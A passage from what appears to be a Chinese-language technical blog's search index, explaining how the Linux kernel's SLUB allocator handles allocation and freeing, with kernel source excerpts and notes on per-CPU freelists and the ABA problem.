\u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u8d70\u200b slow path\uff0c\u200b\u5bfb\u627e\u200b\u5176\u4ed6\u200b freelist\uff0c\u200b\u6216\u8005\u200b\u7533\u8bf7\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u9875\u200b</li> </ol> <p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b\u8fd9\u4e2a\u200b <code>struct kmem_cache</code> \u200b\u662f\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u5206\u914d\u200b\u7684\u200b\u3002\u200b\u5148\u200b\u4e0d\u200b\u8003\u8651\u200b NUMA-aware\uff0c\u200b\u5206\u914d\u200b\u7684\u200b\u5165\u53e3\u200b\u662f\u200b <code>kmem_cache_alloc</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>// in mm/slub.c\nvoid *kmem_cache_alloc(struct kmem_cache *s, gfp_t gfpflags)\n{\n    void *ret = slab_alloc(s, gfpflags, _RET_IP_, s-&gt;object_size);\n\n    trace_kmem_cache_alloc(_RET_IP_, ret, s-&gt;object_size,\n                s-&gt;size, gfpflags);\n\n    return ret;\n}\n\nstatic __always_inline void *slab_alloc(struct kmem_cache *s,\n        gfp_t gfpflags, unsigned long addr, size_t orig_size)\n{\n    return slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr, orig_size);\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u8c03\u7528\u200b\u5230\u200b <code>slab_alloc_node</code>\uff0c\u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b <code>NUMA_NO_NODE</code> \u200b\u8868\u793a\u200b\u4e0d\u200b\u6307\u5b9a\u200b NUMA Node\u3002\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b <code>slab_alloc_node</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// in mm/slub.c\nstatic __always_inline void *slab_alloc_node(struct kmem_cache *s,\n        gfp_t gfpflags, int node, unsigned long addr, size_t orig_size)\n{\n    void *object;\n    struct kmem_cache_cpu *c;\n    struct page *page;\n    unsigned long tid;\n    struct obj_cgroup *objcg = NULL;\n    bool init = false;\n    // some code omitted\n\n    // allocation loop\nredo:\n    // access per-cpu cpu_slab field\n    c = raw_cpu_ptr(s-&gt;cpu_slab);\n    tid = READ_ONCE(c-&gt;tid);\n\n    barrier();\n\n    // access freelist and page\n    object = c-&gt;freelist;\n    page = c-&gt;page;\n\n    if (IS_ENABLED(CONFIG_PREEMPT_RT) ||\n        unlikely(!object || !page || !node_match(page, node))) {\n        // slow-path: call __slab_alloc to do the actual alloc\n        object = __slab_alloc(s, gfpflags, node, addr, c);\n    } else {\n        // fast-path: allocate object from the freelist\n        void *next_object = get_freepointer_safe(s, object);\n\n        if (unlikely(!this_cpu_cmpxchg_double(\n                s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,\n                object, tid,\n                next_object, next_tid(tid)))) {\n            // some code omitted\n            goto redo;\n        }\n        // some code omitted\n    }\n\n    // some code omitted\n    return object;\n}\n</code></pre> <p>\u200b\u5b83\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\uff1a</p> <ol> <li> <p>\u200b\u8bfb\u53d6\u200b kmem_cache \u200b\u91cc\u200b\u7684\u200b Per-CPU cpu_slab \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b kmem_cache_cpu \u200b\u7c7b\u578b\u200b\uff0c\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>// in include/linux/slub_def.h\nstruct kmem_cache_cpu {\n    void **freelist;    /* Pointer to next available object */\n    unsigned long tid;  /* Globally unique transaction id */\n    struct page *page;  /* The slab from which we are allocating */\n    struct page *partial;   /* Partially allocated frozen slabs */\n    local_lock_t lock;  /* Protects the fields above */\n};\n</code></pre> </li> <li> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8bbf\u95ee\u200b\u5b83\u200b\u7684\u200b tid \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u8fd9\u200b\u4ee3\u8868\u200b\u5b83\u200b\u7684\u200b freelist \u200b\u7684\u200b\u7248\u672c\u200b\u3002\u200b\u5148\u200b\u8bfb\u53d6\u200b\u7248\u672c\u200b\uff0c\u200b\u518d\u200b\u4f7f\u7528\u200b freelist\uff0c\u200b\u4f7f\u7528\u200b get_freepointer_safe \u200b\u51fd\u6570\u200b\uff0c\u200b\u627e\u5230\u200b freelist \u200b\u91cc\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\u5c31\u200b\u4fdd\u5b58\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5185\u200b offset \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff1a</p> <pre><code>// in mm/slub.c\nstatic inline void *get_freepointer_safe(struct kmem_cache *s, void *object)\n{\n    unsigned long freepointer_addr;\n    void *p;\n\n    // some code is omitted\n    // compute the address of free pointer\n    freepointer_addr = (unsigned long)object + s-&gt;offset;\n    copy_from_kernel_nofault(&amp;p, (void **)freepointer_addr, sizeof(p));\n    return freelist_ptr(s, p, freepointer_addr);\n}\n</code></pre> </li> <li> <p>\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b cmpxchg\uff0c\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b freelist \u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u6307\u5411\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5931\u8d25\u200b\u5c31\u200b\u4f1a\u200b\u91cd\u8bd5\u200b\u5206\u914d\u200b\uff1a</p> <pre><code>// in mm/slub.c\nif (unlikely(!this_cpu_cmpxchg_double(\n        s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,\n        object, tid,\n        next_object, next_tid(tid)))) {\n    // some code omitted\n    goto redo;\n}\n</code></pre> </li> <li> <p>\u200b\u5982\u679c\u200b\u5206\u914d\u200b\u5931\u8d25\u200b\uff0c\u200b\u5c31\u200b\u8c03\u7528\u200b <code>object = __slab_alloc(s, gfpflags, node, addr, c);</code> \u200b\u8fdb\u5165\u200b slow path \u200b\u903b\u8f91\u200b</p> </li> </ol> <p>\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b <code>slab_alloc_node</code> \u200b\u51fd\u6570\u200b\u91cc\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b fast path \u200b\u903b\u8f91\u200b\uff0c\u200b\u5b83\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b per-cpu \u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u5b83\u200b\u5185\u90e8\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e00\u4e2a\u200b freelist \u200b\u6307\u9488\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e32\u200b\u8d77\u6765\u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u3002\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u4e0d\u540c\u200b CPU \u200b\u62a2\u5360\u200b\u4e00\u4e2a\u200b\u5171\u4eab\u200b\u53d8\u91cf\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e86\u200b per-cpu \u200b\u7ed3\u6784\u200b\u4f53\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u5f88\u200b\u50cf\u200b glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b \u200b\u91cc\u200b\u7684\u200b tcache\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e2a\u200b per-thread \u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b\u9501\u200b\u3002\u200b\u4f46\u200b\u5185\u6838\u200b\u91cc\u200b\u6709\u200b\u62a2\u5360\u200b\u7684\u200b\u5b58\u5728\u200b\uff0c\u200b\u867d\u7136\u200b\u4e0d\u7528\u200b\u9501\u200b\uff0c\u200b\u4f46\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7528\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f7f\u7528\u200b compare exchange \u200b\u8fdb\u884c\u200b\u539f\u5b50\u200b\u66f4\u65b0\u200b\uff0c\u200b\u8fd9\u200b\u6709\u70b9\u200b\u7c7b\u4f3c\u200b glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b \u200b\u91cc\u200b\u7684\u200b fast bin\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u7528\u200b\u7248\u672c\u53f7\u200b <code>tid</code> \u200b\u5462\u200b\uff1f\u200b\u5176\u5b9e\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b compare exchange \u200b\u6709\u200b ABA \u200b\u95ee\u9898\u200b\uff0c\u200b\u5373\u200b\u4ece\u200b\u8bfb\u53d6\u200b\u65e7\u503c\u200b\u5230\u200b compare exchange \u200b\u4e2d\u9014\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e24\u6b21\u200b\u6539\u53d8\u200b <code>A-&gt;B-&gt;A</code>\uff0c\u200b\u5e76\u4e14\u200b\u503c\u200b\u88ab\u200b\u53d8\u56de\u6765\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b compare exchange \u200b\u4f9d\u7136\u200b\u4f1a\u200b\u6210\u529f\u200b\uff0c\u200b\u5c31\u200b\u597d\u50cf\u200b\u8fd9\u200b\u4e24\u6b21\u200b\u6539\u53d8\u200b\u6ca1\u6709\u200b\u53d1\u751f\u200b\u4e00\u6837\u200b\u3002\u200b\u4f46\u662f\u200b\u6dfb\u52a0\u200b\u7248\u672c\u53f7\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5373\u4f7f\u200b\u503c\u53d8\u200b\u4e86\u200b\u56de\u6765\u200b\uff0c\u200b\u7248\u672c\u53f7\u200b\u4e5f\u200b\u53d8\u200b\u4e86\u200b <code>(A,0)-&gt;(B,1)-&gt;(A,2)</code>\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b compare exchange \u200b\u6210\u529f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e2d\u9014\u200b\u4e00\u5b9a\u200b\u6ca1\u6709\u200b\u5176\u4ed6\u200b\u4fee\u6539\u200b\u3002\u200b\u8fd9\u4e2a\u200b trick \u200b\u9700\u8981\u200b\u5904\u7406\u5668\u200b\u652f\u6301\u200b\u53cc\u500d\u200b size_t \u200b\u5927\u5c0f\u200b\u7684\u200b compare exchange\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b trick \u200b\u4e5f\u200b\u88ab\u200b\u7528\u200b\u5728\u200b qemu \u200b\u4e2d\u200b\uff1a\u200b\u7528\u200b compare exchange \u200b\u6a21\u62df\u200b LL/SC \u200b\u7684\u200b\u8bed\u4e49\u200b\uff0c\u200b\u5e76\u4e14\u200b\u907f\u514d\u200b ABA \u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"software/linux_allocator.html#__slab_alloc-slow-path","title":"__slab_alloc (slow path)","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b slow path\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b __slab_alloc \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6211\u4eec\u200b\u77e5\u9053\u200b per-cpu \u200b\u7684\u200b\u65e0\u9501\u200b freelist \u200b\u5df2\u7ecf\u200b\u662f\u200b\u7a7a\u200b\u7684\u200b\uff0c\u200b\u9700\u8981\u200b\u53bb\u200b\u5bfb\u627e\u200b\u4e00\u4e2a\u200b\u6ca1\u6709\u200b\u6ee1\u200b\u7684\u200b slab\uff08\u200b\u53eb\u505a\u200b partial slab\uff0c\u200b\u548c\u200b full slab \u200b\u76f8\u5bf9\u200b\uff09\uff0c\u200b\u4ece\u200b\u5b83\u200b\u7684\u200b freelist \u200b\u91cc\u200b\u53d6\u51fa\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1a</p> <pre><code>static void *__slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\n              unsigned long addr, struct kmem_cache_cpu *c)\n{\n    void *p;\n\n#ifdef CONFIG_PREEMPT_COUNT\n    /*\n     * We may have been preempted and rescheduled on a different\n     * cpu before disabling preemption. Need to reload cpu area\n     * pointer.\n     */\n    c = slub_get_cpu_ptr(s-&gt;cpu_slab);\n#endif\n\n    p = ___slab_alloc(s, gfpflags, node, addr, c);\n#ifdef CONFIG_PREEMPT_COUNT\n    slub_put_cpu_ptr(s-&gt;cpu_slab);\n#endif\n    return p;\n}\n\nstatic void *___slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\n              unsigned long addr, struct kmem_cache_cpu *c)\n{\n    void *freelist;\n    struct page *page;\n    unsigned long flags;\n\n    stat(s, ALLOC_SLOWPATH);\n\nreread_page:\n\n    page = READ_ONCE(c-&gt;page);\n    if (!page) {\n        /*\n         * if the node is not online or has no normal memory, just\n         * ignore the node constraint\n         */\n        if (unlikely(node != NUMA_NO_NODE &amp;&amp;\n                 !node_isset(node, slab_nodes)))\n            node = NUMA_NO_NODE;\n        goto new_slab;\n    }\nredo:\n\n    if (unlikely(!node_match(page, node))) {\n        /*\n         * same as above but node_match() being false already\n         * implies node != NUMA_NO_NODE\n         */\n        if (!node_isset(node, slab_nodes)) {\n            node = NUMA_NO_NODE;\n            goto redo;\n        } else {\n            stat(s, ALLOC_NODE_MISMATCH);\n            goto deactivate_slab;\n        }\n    }\n\n    /*\n     * By rights, we should be searching for a slab page that was\n     * PFMEMALLOC but right now, we are losing the pfmemalloc\n     * information when the page leaves the per-cpu allocator\n     */\n    if (unlikely(!pfmemalloc_match_unsafe(page, gfpflags)))\n        goto deactivate_slab;\n\n    /* must check again c-&gt;page in case we got preempted and it changed */\n    local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n    if (unlikely(page != c-&gt;page)) {\n        local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n        goto reread_page;\n    }\n    freelist = c-&gt;freelist;\n    if (freelist)\n        goto load_freelist;\n\n    freelist = get_freelist(s, page);\n\n    if (!freelist) {\n        c-&gt;page = NULL;\n        local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n        stat(s, DEACTIVATE_BYPASS);\n        goto new_slab;\n    }\n\n    stat(s, ALLOC_REFILL);\n\nload_freelist:\n\n    lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));\n\n    /*\n     * freelist is pointing to the list of objects to be used.\n     * page is pointing to the page from which the objects are obtained.\n     * That page must be frozen for per cpu allocations to work.\n     */\n    VM_BUG_ON(!c-&gt;page-&gt;frozen);\n    c-&gt;freelist = get_freepointer(s, freelist);\n    c-&gt;tid = next_tid(c-&gt;tid);\n    local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n    return freelist;\n\ndeactivate_slab:\n\n    local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n    if (page != c-&gt;page) {\n        local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n        goto reread_page;\n    }\n    freelist = c-&gt;freelist;\n    c-&gt;page = NULL;\n    c-&gt;freelist = NULL;\n    local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n    deactivate_slab(s, page, freelist);\n\nnew_slab:\n\n    if (slub_percpu_partial(c)) {\n        local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n        if (unlikely(c-&gt;page)) {\n            local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n            goto reread_page;\n        }\n        if (unlikely(!slub_percpu_partial(c))) {\n            local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n            /* we were preempted and partial list got empty */\n            goto new_objects;\n        }\n\n        page = c-&gt;page = slub_percpu_partial(c);\n        slub_set_percpu_partial(c, page);\n        local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n        stat(s, CPU_PARTIAL_ALLOC);\n        goto redo;\n    }\n\nnew_objects:\n\n    freelist = get_partial(s, gfpflags, node, &amp;page);\n    if (freelist)\n        goto check_new_page;\n\n    slub_put_cpu_ptr(s-&gt;cpu_slab);\n    page = new_slab(s, gfpflags, node);\n    c = slub_get_cpu_ptr(s-&gt;cpu_slab);\n\n    if (unlikely(!page)) {\n        slab_out_of_memory(s, gfpflags, node);\n        return NULL;\n    }\n\n    /*\n     * No other reference to the page yet so we can\n     * muck around with it freely without cmpxchg\n     */\n    freelist = page-&gt;freelist;\n    page-&gt;freelist = NULL;\n\n    stat(s, ALLOC_SLAB);\n\ncheck_new_page:\n\n    if (kmem_cache_debug(s)) {\n        if (!alloc_debug_processing(s, page, freelist, addr)) {\n            /* Slab failed checks. Next slab needed */\n            goto new_slab;\n        } else {\n            /*\n             * For debug case, we don't load freelist so that all\n             * allocations go through alloc_debug_processing()\n             */\n            goto return_single;\n        }\n    }\n\n    if (unlikely(!pfmemalloc_match(page, gfpflags)))\n        /*\n         * For !pfmemalloc_match() case we don't load freelist so that\n         * we don't make further mismatched allocations easier.\n         */\n        goto return_single;\n\nretry_load_page:\n\n    local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n    if (unlikely(c-&gt;page)) {\n        void *flush_freelist = c-&gt;freelist;\n        struct page *flush_page = c-&gt;page;\n\n        c-&gt;page = NULL;\n        c-&gt;freelist = NULL;\n        c-&gt;tid = next_tid(c-&gt;tid);\n\n        local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\n\n        deactivate_slab(s, flush_page, flush_freelist);\n\n        stat(s, CPUSLAB_FLUSH);\n\n        goto retry_load_page;\n    }\n    c-&gt;page = page;\n\n    goto load_freelist;\n\nreturn_single:\n\n    deactivate_slab(s, page, get_freepointer(s, freelist));\n    return freelist;\n}\n</code></pre> <p>\u200b\u8fd9\u200b\u6bb5\u200b\u4ee3\u7801\u200b\u6709\u70b9\u200b\u957f\u200b\uff0c\u200b\u4e0b\u9762\u200b\u6574\u7406\u200b\u4e00\u4e0b\u200b\u5b83\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>\u200b\u9996\u5148\u200b\u5c1d\u8bd5\u200b\u8bfb\u53d6\u200b\u5f53\u524d\u200b per-cpu \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b slab\uff08\u200b\u5373\u200b <code>c-&gt;page</code>\uff09\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u662f\u200b\u7a7a\u200b\u6307\u9488\u200b\u7684\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53bb\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b slab</li> <li>\u200b\u5982\u679c\u200b\u65b0\u200b\u5206\u914d\u200b\u4e86\u200b\u4e00\u4e2a\u200b slab\uff0c\u200b\u6216\u8005\u200b\u6709\u200b\u4e86\u200b slab\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b\u5b83\u200b\u7684\u200b freelist \u200b\u63a5\u7ba1\u200b\u8fc7\u6765\u200b\uff1a\u200b\u628a\u200b <code>struct page</code> \u200b\u91cc\u9762\u200b\u7684\u200b freelist \u200b\u590d\u5236\u5230\u200b per-cpu \u200b\u7ed3\u6784\u200b\u4f53\u200b\u91cc\u9762\u200b\u7684\u200b freelist \u200b\u6307\u9488\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b <code>struct page</code> \u200b\u91cc\u9762\u200b\u7684\u200b freelist \u200b\u6307\u9488\u200b\u6539\u6210\u200b NULL\uff0c\u200b\u5f53\u7136\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u9700\u8981\u200b\u7528\u200b compare exchange \u200b\u6765\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5e76\u200b\u6807\u8bb0\u200b\u8fd9\u4e2a\u200b slab \u200b\u4e3a\u200b frozen \u200b\u72b6\u6001\u200b\uff0c\u200b\u5373\u200b\u88ab\u200b\u4e00\u4e2a\u200b cpu core \u200b\u5360\u7528\u200b\u4e86\u200b\uff0c\u200b\u53ea\u80fd\u200b\u7531\u200b\u8fd9\u4e2a\u200b cpu core \u200b\u6765\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u5982\u679c\u200b\u83b7\u53d6\u200b\u5230\u200b\u4e00\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b freelist\uff0c\u200b\u5c31\u200b\u4ece\u200b\u94fe\u8868\u200b\u5934\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u66f4\u65b0\u200b freelist\uff0c\u200b\u6307\u5411\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u975e\u7a7a\u200b\u7684\u200b freelist\uff0c\u200b\u518d\u200b\u53bb\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b slab</li> </ol>"},{"location":"software/linux_allocator.html#kmem_cache_free","title":"kmem_cache_free","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u770b\u200b free \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>void kmem_cache_free(struct kmem_cache *s, void *x)\n{\n    s = cache_from_obj(s, x);\n    if (!s)\n        return;\n    slab_free(s, virt_to_head_page(x), x, NULL, 1, _RET_IP_);\n    trace_kmem_cache_free(_RET_IP_, x, s-&gt;name);\n}\n</code></pre> <p>\u200b\u5b83\u200b\u9996\u5148\u200b\u5229\u7528\u200b\u5185\u6838\u200b\u7684\u200b <code>virt_to_head_page</code> \u200b\u529f\u80fd\u200b\u6765\u200b\u67e5\u8be2\u200b\u8fd9\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u5c5e\u4e8e\u200b\u54ea\u4e2a\u200b slab\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b slab \u200b\u662f\u200b\u4f7f\u7528\u200b <code>alloc_pages</code> \u200b\u5206\u914d\u200b\u51fa\u6765\u200b\u7684\u200b\u8fde\u7eed\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b\u5feb\u901f\u200b\u5730\u200b\u627e\u5230\u200b slab \u200b\u7684\u200b <code>struct page</code>\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u5b83\u200b\u5185\u90e8\u200b\u7684\u200b slab_cache \u200b\u5b57\u200b\u6bb5\u200b\u627e\u5230\u200b\u5b83\u200b\u5bf9\u5e94\u200b\u7684\u200b <code>struct kmem_cache</code>\u3002\u200b\u627e\u5230\u200b slab \u200b\u4ee5\u540e\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u4e5f\u200b\u5206\u200b fast path \u200b\u548c\u200b slow path\uff0c\u200b\u5176\u4e2d\u200b fast path \u200b\u903b\u8f91\u200b\u5728\u200b <code>do_slab_free</code> \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>static __always_inline void do_slab_free(struct kmem_cache *s,\n                struct page *page, void *head, void *tail,\n                int cnt, unsigned long addr)\n{\n    void *tail_obj = tail ? : head;\n    struct kmem_cache_cpu *c;\n    unsigned long tid;\n\n    /* memcg_slab_free_hook() is already called for bulk free. */\n    if (!tail)\n        memcg_slab_free_hook(s, &amp;head, 1);\nredo:\n    /*\n     * Determine the currently cpus per cpu slab.\n     * The cpu may change afterward. However that does not matter since\n     * data is retrieved via this pointer. If we are on the same cpu\n     * during the cmpxchg then the free will succeed.\n     */\n    c = raw_cpu_ptr(s-&gt;cpu_slab);\n    tid = READ_ONCE(c-&gt;tid);\n\n    /* Same with comment on barrier() in slab_alloc_node() */\n    barrier();\n\n    if (likely(page == c-&gt;page)) {\n#ifndef CONFIG_PREEMPT_RT\n        void **freelist = READ_ONCE(c-&gt;freelist);\n\n        set_freepointer(s, tail_obj, freelist);\n\n        if (unlikely(!this_cpu_cmpxchg_double(\n                s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,\n                freelist, tid,\n                head, next_tid(tid)))) {\n\n            note_cmpxchg_failure(\"slab_free\", s, tid);\n            goto redo;\n        }\n#else /* CONFIG_PREEMPT_RT */\n        /*\n         * We cannot use the lockless fastpath on PREEMPT_RT because if\n         * a slowpath has taken the local_lock_irqsave(), it is not\n         * protected against a fast path operation in an irq handler. So\n         * we need to take the local_lock. We shouldn't simply defer to\n         * __slab_free() as that wouldn't use the cpu freelist at all.\n         */\n        void **freelist;\n\n        local_lock(&amp;s-&gt;cpu_slab-&gt;lock);\n        c = this_cpu_ptr(s-&gt;cpu_slab);\n        if (unlikely(page != c-&gt;page)) {\n            local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);\n            goto redo;\n        }\n        tid = c-&gt;tid;\n        freelist = c-&gt;freelist;\n\n        set_freepointer(s, tail_obj, freelist);\n        c-&gt;freelist = head;\n        c-&gt;tid = next_tid(tid);\n\n        local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);\n#endif\n        stat(s, FREE_FASTPATH);\n    } else\n        __slab_free(s, page, head, tail_obj, cnt, addr);\n}\n</code></pre> <p>\u200b\u5927\u6982\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u91ca\u653e\u200b\u7684\u200b object\uff0c\u200b\u521a\u597d\u200b\u5728\u200b\u5f53\u524d\u200b cpu core \u200b\u5360\u7528\u200b\u7684\u200b slab \u200b\u5185\u200b\uff0c\u200b\u5c31\u200b\u76f4\u63a5\u200b\u628a\u200b\u5b83\u200b\u653e\u5230\u200b per-cpu \u200b\u7684\u200b freelist \u200b\u94fe\u8868\u200b\u5934\u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0d\u7528\u200b\u52a0\u9501\u200b\uff0c\u200b\u76f4\u63a5\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b fast path\u3002\u200b\u5982\u679c\u200b\u91ca\u653e\u200b\u7684\u200b object \u200b\u4e0d\u200b\u5728\u200b\u5f53\u524d\u200b cpu core \u200b\u63a5\u7ba1\u200b\u7684\u200b slab \u200b\u5185\u200b\uff0c\u200b\u5c31\u200b\u8fdb\u5165\u200b slow path\uff0c\u200b\u5728\u200b <code>__slab_free</code> \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>static void __slab_free(struct kmem_cache *s, struct page *page,\n            void *head, void *tail, int cnt,\n            unsigned long addr)\n\n{\n    void *prior;\n    int was_frozen;\n    struct page new;\n    unsigned long counters;\n    struct kmem_cache_node *n = NULL;\n    unsigned long flags;\n\n    stat(s, FREE_SLOWPATH);\n\n    if (kfence_free(head))\n        return;\n\n    if (kmem_cache_debug(s) &amp;&amp;\n        !free_debug_processing(s, page, head, tail, cnt, addr))\n        return;\n\n    do {\n        if (unlikely(n)) {\n            spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\n            n = NULL;\n        }\n        prior = page-&gt;freelist;\n        counters = page-&gt;counters;\n        set_freepointer(s, tail, prior);\n        new.counters = counters;\n        was_frozen = new.frozen;\n        new.inuse -= cnt;\n        if ((!new.inuse || !prior) &amp;&amp; !was_frozen) {\n\n            if (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) {\n\n                /*\n                 * Slab was on no list before and will be\n                 * partially empty\n                 * We can defer the list move and instead\n                 * freeze it.\n                 */\n                new.frozen = 1;\n\n            } else { /* Needs to be taken off a list */\n\n                n = get_node(s, page_to_nid(page));\n                /*\n                 * Speculatively acquire the list_lock.\n                 * If the cmpxchg does not succeed then we may\n                 * drop the list_lock without any processing.\n                 *\n                 * Otherwise the list_lock will synchronize with\n                 * other processors updating the list of slabs.\n                 */\n                spin_lock_irqsave(&amp;n-&gt;list_lock, flags);\n\n            }\n        }\n\n    } while (!cmpxchg_double_slab(s, page,\n        prior, counters,\n        head, new.counters,\n        \"__slab_free\"));\n\n    if (likely(!n)) {\n\n        if (likely(was_frozen)) {\n            /*\n             * The list lock was not taken therefore no list\n             * activity can be necessary.\n             */\n            stat(s, FREE_FROZEN);\n        } else if (new.frozen) {\n            /*\n             * If we just froze the page then put it onto the\n             * per cpu partial list.\n             */\n            put_cpu_partial(s, page, 1);\n            stat(s, 